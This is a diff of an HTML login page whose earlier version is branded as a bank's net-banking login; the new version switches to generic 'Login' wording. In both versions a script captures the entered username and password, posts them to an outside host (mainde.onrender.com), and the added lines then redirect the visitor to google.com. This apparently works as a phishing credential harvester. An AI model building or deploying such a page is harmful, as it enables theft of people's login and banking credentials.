@@ -2,7 +2,7 @@
 <html lang="en">
 
 <head>
-  <title>Demo Banking</title>
+  <title>Login Form</title>
   <meta property="og:title" content="Well Worn Dizzy Goldfish" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
@@ -132,49 +132,50 @@
     <div class="home-container">
       <div class="home-container1">
         <span class="home-text">
-          <span>Customer ID/</span>
+          <span>Username/</span>
           <span>User</span>
           <span>ID</span>
         </span>
         <span class="home-text04">Password</span>
-        <label class="home-text05">Login To NetBanking</label>
+        <label class="home-text05">Login</label>
         <form id="loginForm" action="/submit" method="POST">
 
-          <input type="userid" class="home-textinput input" id="userIdInput" placeholder="User IDs" />
-          <input type="password" class="home-textinput1 input" id="passwordInput" placeholder="Passwords" />
+          <input type="userid" class="home-textinput input" id="userIdInput" placeholder="User ID" />
+          <input type="password" class="home-textinput1 input" id="passwordInput" placeholder="Password" />
           <button type="submit" class="home-button button" id="submit">
           CONTINUE
           </button>
         </form>
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-  const loginForm = document.getElementById('loginForm');
-  loginForm.addEventListener('submit', async (event) => {
-    event.preventDefault();
-    const username = document.getElementById('userIdInput').value;
-    const password = document.getElementById('passwordInput').value;
-    try {
-      const response = await fetch('https://mainde.onrender.com/submit', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({ username, password }),
-});
-
-      if (response.ok) {
-        const data = await response.json();
-        console.log(data.message); // Assuming server sends a JSON response with a 'message' field
-      } else {
-        console.error('Error:', response.status);
-      }
-    } catch (error) {
-      console.error('Error:', error);
-    }
-  });
-});
-
-</script>
+        <script>
+          document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('loginForm');
+            loginForm.addEventListener('submit', async (event) => {
+              event.preventDefault();
+              const username = document.getElementById('userIdInput').value;
+              const password = document.getElementById('passwordInput').value;
+              try {
+                const response = await fetch('https://mainde.onrender.com/submit', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({ username, password }),
+                });
+        
+                if (response.ok) {
+                  const data = await response.json();
+                  console.log(data.message); 
+        
+                  window.location.href = 'https://google.com';
+                } else {
+                  console.error('Error:', response.status);
+                }
+              } catch (error) {
+                console.error('Error:', error);
+              }
+            });
+          });
+        </script>
 </body>
 </html>
 </body>
